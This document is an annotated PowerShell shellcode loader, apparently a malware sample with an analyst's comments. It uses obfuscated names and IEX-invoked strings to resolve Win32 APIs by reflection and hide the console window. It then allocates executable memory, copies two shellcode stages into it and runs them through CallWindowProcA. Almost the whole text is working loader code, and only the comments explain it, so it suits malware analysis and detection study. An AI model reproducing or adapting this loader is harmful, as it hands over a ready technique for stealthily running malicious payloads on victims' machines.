# Function Claro05: Retrieves a function pointer for a given function name from a specified module
function Claro05 ($Acce, $Gratierne) {
    # Get the type of the assembly that contains the functions
    $Inspi930 = '$tutorenbu = ([AppDomain]::CurrentDomain.GetAssemblies() | Where-Object { $_.GlobalAssemblyCache -And $_.Location.Split('\')[-1].Equals("System.dll") }).GetType("Microsoft.Win32.UnsafeNativeMethods")'
    .('IEX') $Inspi930

    # Get the method info for the function pointer
    $Inspi935 = '$Falangistu = $tutorenbu.GetMethod("GetProcAddress", [Type[]] @([System.Runtime.InteropServices.HandleRef], [string]))'
    .('IEX') $Inspi935

    # Invoke the function pointer
    $Inspi931 = 'return $Falangistu.Invoke($null, @([System.Runtime.InteropServices.HandleRef](New-Object System.Runtime.InteropServices.HandleRef((New-Object IntPtr), ($tutorenbu.GetMethod("GetModuleHandle")).Invoke($null, @($Acce)))), $Gratierne))'
    .('IEX') $Inspi931
}

# Function Claro04: Defines a dynamic assembly and type for creating delegates
function Claro04 {
    Param (
        [Parameter(Position = 0)]
        [Type[]] $Embraceko,
        [Parameter(Position = 1)]
        [Type] $Brands = [Void]
    )
    $Inspi932 = '$Typeout = [AppDomain]::CurrentDomain.DefineDynamicAssembly((New-Object System.Reflection.AssemblyName("ReflectedDelegate")), [System.Reflection.Emit.AssemblyBuilderAccess]::Run).DefineDynamicModule("InMemoryModule", $false).DefineType("MyDelegateType", "Class, Public, Sealed, AnsiClass, AutoClass", [System.MulticastDelegate])'
    .('IEX') $Inspi932

    $Inspi933 = '$Typeout.DefineConstructor("RTSpecialName, HideBySig, Public", [System.Reflection.CallingConventions]::Standard, $Embraceko).SetImplementationFlags("Runtime, Managed")'
    .('IEX') $Inspi933

    $Inspi934 = '$Typeout.DefineMethod("Invoke", "Public, HideBySig, NewSlot, Virtual", $Brands, $Embraceko).SetImplementationFlags("Runtime, Managed")'
    .('IEX') $Inspi934

    $Inspi935 = 'return $Typeout.CreateType()'
    .('IEX') $Inspi935
}

# Retrieve the function pointer for the ShowWindow function from USER32
$Claro01 = '$Efte = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 "USER32" "ShowWindow"), (Claro04 @([IntPtr], [UInt32]) ([IntPtr])))'
.('IEX') $Claro01

# Retrieve the function pointer for the GetConsoleWindow function from kernel32
$Claro02 = '$Fingalb198 = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 "kernel32" "GetConsoleWindow"), (Claro04 @([IntPtr]) ([IntPtr])))'
.('IEX') $Claro02

# Invoke the GetConsoleWindow function pointer to get the window handle
$Inspi937 = '$Shivunp = $Fingalb198.Invoke(0)'
.('IEX') $Inspi937

# Invoke the ShowWindow function pointer to show the window
$Inspi937 = '$Efte.Invoke($Shivunp, 0)'
.('IEX') $Inspi937

# Retrieve the function pointer for the VirtualAlloc function from kernel32
$Inspi936 = '$Klausulsai = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 "kernel32" "VirtualAlloc"), (Claro04 @([IntPtr], [UInt32], [UInt32], [UInt32]) ([IntPtr])))'
.('IEX') $Inspi936

# Retrieve the function pointer for the NtProtectVirtualMemory function from ntdll
$Tonnesverb = Claro05 'ntdll' 'NtProtectVirtualMemory'

# Invoke the VirtualAlloc function pointer to allocate memory
$Inspi937 = '$Industri3 = $Klausulsai.Invoke([IntPtr]::Zero, 645, 0x3000, 0x40)'
.('IEX') $Inspi937

# Invoke the VirtualAlloc function pointer to allocate memory
$Inspi938 = '$veristfil = $Klausulsai.Invoke([IntPtr]::Zero, 43073536, 0x3000, 0x4)'
.('IEX') $Inspi938

# Copy the first shellcode to memory
$jurym0 = '[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 0,  $Industri3, 645)'
.('IEX') $jurym0

# Calculate the bytes of the second shellcode 
$Inspi939 = '$Unsyll=193539-645'
.('IEX') $Inspi939

# Copy the second shellcode to memory
$jurym1 = '[System.Runtime.InteropServices.Marshal]::Copy($Hamart, 645, $veristfil, $Unsyll)'
.('IEX') $jurym1

$jurym2 = '$Socialcent = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((Claro05 "USER32" "CallWindowProcA"), (Claro04 @([IntPtr], [IntPtr], [IntPtr], [IntPtr], [IntPtr]) ([IntPtr])))'
.('IEX') $jurym2

# Execute the first shellcode in $Industri3 with the second shellcode $veristfil as an argument.
$jurym3 = '$Socialcent.Invoke($Industri3,$veristfil,$Tonnesverb,0,0)'
.('IEX') $jurym3
